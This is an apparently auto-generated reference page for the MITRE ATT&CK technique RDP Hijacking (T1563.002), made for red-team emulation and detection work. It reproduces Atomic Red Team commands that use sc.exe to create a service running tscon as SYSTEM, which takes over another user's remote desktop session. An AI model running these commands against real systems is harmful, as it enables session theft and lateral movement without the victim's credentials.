
# RDP Hijacking

## Description

### MITRE Description

> Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1563/002

## Potential Commands

```
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:#{Destination_ID}"
net start sesshijack
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:rdp-tcp#55"
net start sesshijack
```

## Commands Dataset

```
[{'command': 'query user\n'
             'sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 '
             '/dest:#{Destination_ID}"\n'
             'net start sesshijack\n',
  'name': None,
  'source': 'atomics/T1563.002/T1563.002.yaml'},
 {'command': 'query user\n'
             'sc.exe create sesshijack binpath= "cmd.exe /k tscon '
             '#{Session_ID} /dest:rdp-tcp#55"\n'
             'net start sesshijack\n',
  'name': None,
  'source': 'atomics/T1563.002/T1563.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Remote Service Session Hijacking: RDP Hijacking': {'atomic_tests': [{'auto_generated_guid': 'a37ac520-b911-458e-8aed-c5f1576d9f46',
                                                                                               'description': 'RDP '
                                                                                                              'hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) '
                                                                                                              '- '
                                                                                                              'how '
                                                                                                              'to '
                                                                                                              'hijack '
                                                                                                              'RDS '
                                                                                                              'and '
                                                                                                              'RemoteApp '
                                                                                                              'sessions '
                                                                                                              'transparently '
                                                                                                              'to '
                                                                                                              'move '
                                                                                                              'through '
                                                                                                              'an '
                                                                                                              'organization\n',
                                                                                               'executor': {'cleanup_command': 'sc.exe '
                                                                                                                               'delete '
                                                                                                                               'sesshijack '
                                                                                                                               '>nul '
                                                                                                                               '2>&1\n',
                                                                                                            'command': 'query '
                                                                                                                       'user\n'
                                                                                                                       'sc.exe '
                                                                                                                       'create '
                                                                                                                       'sesshijack '
                                                                                                                       'binpath= '
                                                                                                                       '"cmd.exe '
                                                                                                                       '/k '
                                                                                                                       'tscon '
                                                                                                                       '#{Session_ID} '
                                                                                                                       '/dest:#{Destination_ID}"\n'
                                                                                                                       'net '
                                                                                                                       'start '
                                                                                                                       'sesshijack\n',
                                                                                                            'elevation_required': True,
                                                                                                            'name': 'command_prompt'},
                                                                                               'input_arguments': {'Destination_ID': {'default': 'rdp-tcp#55',
                                                                                                                                      'description': 'Connect '
                                                                                                                                                     'the '
                                                                                                                                                     'session '
                                                                                                                                                     'of '
                                                                                                                                                     'another '
                                                                                                                                                     'user '
                                                                                                                                                     'to '
                                                                                                                                                     'a '
                                                                                                                                                     'different '
                                                                                                                                                     'session',
                                                                                                                                      'type': 'String'},
                                                                                                                   'Session_ID': {'default': '1337',
                                                                                                                                  'description': 'The '
                                                                                                                                                 'ID '
                                                                                                                                                 'of '
                                                                                                                                                 'the '
                                                                                                                                                 'session '
                                                                                                                                                 'to '
                                                                                                                                                 'which '
                                                                                                                                                 'you '
                                                                                                                                                 'want '
                                                                                                                                                 'to '
                                                                                                                                                 'connect',
                                                                                                                                  'type': 'String'}},
                                                                                               'name': 'RDP '
                                                                                                       'hijacking',
                                                                                               'supported_platforms': ['windows']}],
                                                                             'attack_technique': 'T1563.002',
                                                                             'display_name': 'Remote '
                                                                                             'Service '
                                                                                             'Session '
                                                                                             'Hijacking: '
                                                                                             'RDP '
                                                                                             'Hijacking'}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations


* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)

* [Limit Access to Resource Over Network](../mitigations/Limit-Access-to-Resource-Over-Network.md)
    
* [Audit](../mitigations/Audit.md)
    
* [User Account Management](../mitigations/User-Account-Management.md)
    
* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    
* [Network Segmentation](../mitigations/Network-Segmentation.md)
    

# Actors

None
